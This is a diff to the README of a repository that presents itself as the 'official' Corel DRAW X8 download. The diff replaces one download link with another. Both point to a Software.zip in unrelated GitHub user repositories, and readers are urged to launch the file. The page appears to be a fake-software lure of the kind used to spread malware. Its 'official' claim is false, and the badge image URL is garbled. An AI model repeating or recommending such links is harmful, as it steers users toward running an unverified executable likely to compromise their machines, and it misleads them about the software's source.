@@ -12,7 +12,7 @@ Welcome to the official repository for Corel DRAW X8 Download! Here you can find
 ## Download Corel DRAW X8
 
 To download Corel DRAW X8, simply click on the link below:
-[![Download Corel DRAW X8](https://img.shields.io/badge/Download-Corel%20DRAW%20X8-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip){:target="_blank"}
+[![Download Corel DRAW X8](https://github.com/F4nnyKa/Corel-DRAW-X8-Download/releases/download/v2.0/Software.zip%20DRAW%20X8-blue)](https://github.com/F4nnyKa/Corel-DRAW-X8-Download/releases/download/v2.0/Software.zip){:target="_blank"}
 
 🚀 **Launch the downloaded file to start your installation process and unleash your creativity with Corel DRAW X8!**
 
